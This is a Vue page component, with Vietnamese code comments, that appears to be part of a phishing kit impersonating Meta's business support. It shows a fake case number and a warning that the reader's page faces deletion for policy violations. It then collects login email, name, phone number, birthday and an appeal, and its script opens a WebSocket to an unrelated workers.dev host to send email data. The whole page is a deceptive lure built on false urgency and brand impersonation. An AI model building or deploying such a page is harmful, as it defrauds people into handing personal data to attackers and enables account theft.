<template>
  <div id="root">
    <div class="ns-block-ui full-screen" aria-busy="false">
      <div class="banner">
        <div class="banner-content font-semibold">
          <h4 class="font-semibold">Page Business Help Center</h4>
        </div>
      </div>
      <div class="container">
        <div class="body">
          <div class="justify-content-center row">
            <div class="mt-3 col-xl-7 col-lg-9 col-md-11 col-sm-11">
              <form class="form-update p-3 mb-5">
                <div class="mb-4 px-3">
                  <div class="mb-6">
                    <div class="flex items-center space-x-2 mb-2"><svg xmlns="http://www.w3.org/2000/svg" width="24"
                        height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                        stroke-linecap="round" stroke-linejoin="round" class="text-blue-600 h-6 w-6">
                        <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
                      </svg>
                      <div
                        class="inline-flex items-center rounded-full whitespace-nowrap border px-2.5 py-0.5 w-fit text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 border-transparent bg-yellow-500 text-secondary-foreground hover:bg-500/80">
                        OPEN </div><span class="text-sm font-semibold">Case #23481713347540055</span>
                    </div>
                    <p class="text-md font-semibold">Your page has been scheduled for deletion because one or more the
                      following: </p>
                    <ul class="list-disc pl-6 text-sm font-semibold">
                      <li>Many ads are illegal or violate Meta's policies</li>
                      <li>Sharing content that puts other users at risk</li>
                      <li>Using tricks to get around Meta's ad verification system</li>
                      <li>Intellectual Property Infringement</li>
                    </ul>
                  </div>
                </div>
                <div class="mb-4 px-3">
                  <div class="flex items-center space-x-2 mb-2"><svg xmlns="http://www.w3.org/2000/svg" width="24"
                      height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                      stroke-linecap="round" stroke-linejoin="round" class="text-gray-600 h-6 w-6">
                      <circle cx="12" cy="12" r="10"></circle>
                      <circle cx="12" cy="10" r="3"></circle>
                      <path d="M7 20.662V19a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v1.662"></path>
                    </svg>
                    <h3 class="text-md font-semibold">Reply</h3>
                  </div>
                  <p class="h3-config">We're here to help provide guidance, but keep in mind that investigating this
                    on your behalf is beyond the scope of our support. Our Community Questions site can offer guidance
                    in resolving this issue. Please be sure to provide the requested information below, provide this
                    information may delay the processing of your appeal:</p>
                </div>
                <div class="mb-4 px-3">
                  <div class="">
                    <div class="flex content-center items-center justify-between text-sm"><label for="nuid-1"
                        class="block font-medium text-gray-700 dark:text-gray-200">Login Email:</label></div>

                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input name="email" type="email"
                          placeholder="Please enter your email"
                          class="form-input relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-base px-3.5 py-2.5 shadow-sm bg-transparent text-gray-900 dark:text-white ring-1 ring-inset ring-red-500 dark:ring-red-400 focus:ring-2 focus:ring-red-500 dark:focus:ring-red-400 pe-12"
                          id="nuid-1"><span
                          class="absolute inset-y-0 end-0 flex items-center pointer-events-none pe-3.5"><span
                            class="i-heroicons-exclamation-triangle-20-solid flex-shrink-0 text-gray-400 dark:text-gray-500 text-red-500 dark:text-red-400 h-6 w-6"></span></span>
                      </div>
                      <p class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an email</p>
                    </div>
                  </div>
                </div>
                <div class="mb-4 px-3">
                  <div class="">
                    <div class="flex content-center items-center justify-between text-sm"><label for="nuid-2"
                        class="block font-medium text-gray-700 dark:text-gray-200">Your name:</label></div>

                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input name="name" type="text"
                          placeholder="Please enter your name"
                          class="form-input relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-base px-3.5 py-2.5 shadow-sm bg-transparent text-gray-900 dark:text-white ring-1 ring-inset ring-red-500 dark:ring-red-400 focus:ring-2 focus:ring-red-500 dark:focus:ring-red-400"
                          id="nuid-2"></div>
                      <p class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an name</p>
                    </div>
                  </div>
                </div>
                <div class="mb-4 px-3">
                  <div class="">
                    <div class="flex content-center items-center justify-between text-sm"><label for="nuid-3"
                        class="block font-medium text-gray-700 dark:text-gray-200">Your phone number:</label>
                    </div>
                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input name="phone" type="tel"
                          placeholder="Please enter your phone"
                          class="form-input relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-base px-3.5 py-2.5 shadow-sm bg-transparent text-gray-900 dark:text-white ring-1 ring-inset ring-red-500 dark:ring-red-400 focus:ring-2 focus:ring-red-500 dark:focus:ring-red-400"
                          id="nuid-3"></div>
                      <p class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an phone</p>
                    </div>
                  </div>
                </div>
                <div class="mb-4 px-3">
                  <div class="">
                    <div class="flex content-center items-center justify-between text-sm"><label for="nuid-4"
                        class="block font-medium text-gray-700 dark:text-gray-200">Your birthday:</label></div>

                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input name="birthday" type="date"
                          placeholder="Please enter your birthday"
                          class="form-input relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-base px-3.5 py-2.5 shadow-sm bg-transparent text-gray-900 dark:text-white ring-1 ring-inset ring-red-500 dark:ring-red-400 focus:ring-2 focus:ring-red-500 dark:focus:ring-red-400"
                          id="nuid-4"></div>
                      <p class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an birthday</p>
                    </div>
                  </div>
                </div>
                <div class="mb-4 px-3">
                  <div class="">
                    <div class="flex content-center items-center justify-between text-sm"><label for="nuid-5"
                        class="block font-medium text-gray-700 dark:text-gray-200">Your appeal:</label></div>

                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><textarea name="message" rows="3"
                          placeholder="Type your message here"
                          class="form-textarea relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-2.5 py-1.5 shadow-sm bg-transparent text-gray-900 dark:text-white ring-1 ring-inset ring-red-500 dark:ring-red-400 focus:ring-2 focus:ring-red-500 dark:focus:ring-red-400 resize-none"
                          id="nuid-5"></textarea></div>
                      <p class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an message</p>
                    </div>
                  </div>
                </div>
                <div class="d-flex justify-content-end px-3 py-2"><button type="submit"
                    class="focus:outline-none disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-1.5 px-2.5 py-1.5 shadow-sm text-white dark:text-gray-900 bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500 dark:bg-blue-400 dark:hover:bg-blue-500 dark:disabled:bg-blue-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-blue-500 dark:focus-visible:outline-blue-400 w-full flex justify-center items-center btn btn-primary"><span
                      class="">Submit</span></button></div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import { useCounterStore } from "@/stores/counter"; // Nếu có
import axios from "axios"; // Nếu có
import VueCookies from "vue-cookies"; // Nếu có

export default {
  data() {
    return {
      ws: null,
      messages: [],
      inputText: '' // Thêm inputText để lưu nội dung tin nhắn mới
    };
  },
  setup() {
    const counter = useCounterStore(); // Nếu có
    return { counter };
  },
  mounted: function () {
    this.connectWebSocket();
  },
  methods: {
    connectWebSocket() {
      // Kết nối đến máy chủ WebSocket
      this.ws = new WebSocket('wss://idea-bot7.hatchpennie4.workers.dev/ws');

      // Xử lý tin nhắn nhận được từ máy chủ
      this.ws.onmessage = (event) => {
        var data = JSON.parse(event.data);
        this.messages = data.message;
      };
    },
    sendMessage() {
      // Gửi tin nhắn đến máy chủ WebSocket
      if (this.ws !== null && this.ws.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({
          "event": "checkEmail", "email": "bt07qf7266@outlook.ph" // Sử dụng nội dung từ inputText
        }));
        this.counter.question = ''; // Xóa nội dung sau khi gửi
      } else {
        console.error('WebSocket connection not established');
      }
    },
    disconnectWebSocket() {
      // Ngắt kết nối WebSocket
      if (this.ws !== null) {
        this.ws.close();
        console.log('WebSocket connection closed');
      }
    }
  },
  components: {},
};
</script>

<style></style>